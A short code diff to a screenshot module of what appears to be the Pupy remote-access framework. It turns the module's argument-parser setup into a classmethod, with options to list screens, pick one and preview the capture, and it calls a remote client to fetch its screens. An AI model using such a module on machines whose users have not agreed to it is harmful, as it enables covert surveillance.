@@ -48,11 +48,12 @@ class Screenshoter(PupyModule):
         'mss', 'screenshot', 'png'
     ]
 
-    def init_argparse(self):
-        self.arg_parser = PupyArgumentParser(prog='screenshot', description=self.__doc__)
-        self.arg_parser.add_argument('-e', '--enum', action='store_true', help='enumerate screen')
-        self.arg_parser.add_argument('-s', '--screen', type=int, default=None, help='take a screenshot on a specific screen (default all screen on one screenshot)')
-        self.arg_parser.add_argument('-v', '--view', action='store_true', help='directly open the default image viewer on the screenshot for preview')
+    @classmethod
+    def init_argparse(cls):
+        cls.arg_parser = PupyArgumentParser(prog='screenshot', description=cls.__doc__)
+        cls.arg_parser.add_argument('-e', '--enum', action='store_true', help='enumerate screen')
+        cls.arg_parser.add_argument('-s', '--screen', type=int, default=None, help='take a screenshot on a specific screen (default all screen on one screenshot)')
+        cls.arg_parser.add_argument('-v', '--view', action='store_true', help='directly open the default image viewer on the screenshot for preview')
 
     def run(self, args):
         screens = self.client.remote('screenshot', 'screens')
